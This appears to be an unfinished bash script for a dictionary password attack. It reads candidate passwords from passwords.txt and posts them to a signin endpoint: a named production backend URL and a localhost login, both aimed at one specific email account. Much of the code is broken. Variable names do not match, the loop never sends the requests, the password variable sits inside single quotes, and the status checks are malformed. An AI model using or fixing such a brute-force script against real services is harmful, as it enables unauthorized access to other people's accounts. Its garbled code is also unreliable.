#!/bin/bash

#grep "search_word" filename.txt

dictionarry="passwords.txt"

pro-url="https://vritywire-backend.onrender.com/api/auth/signin"


curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"mypassword"}'

trigger(){

url=$1

for word in $(cat passwords.txt); do
    echo "Word: $word"
done


post_req=$(curl -X POST "${url}/api/signin" \
 -H "Content-Type: application/json" \ 
-d '{"email" : "dumnekaran3@gmail.com","password":"$word"}')


status=$(curl -s /dev/null/ "${http_code}" -L "${url}")
body=$(curl -s /dev/null/ -L "${url}")
echo "$status"

if [ "$status" == 200]; then
    

    echo "login sucesss "

else
    echo "not login"

fi





}

trigger "$pro_url"


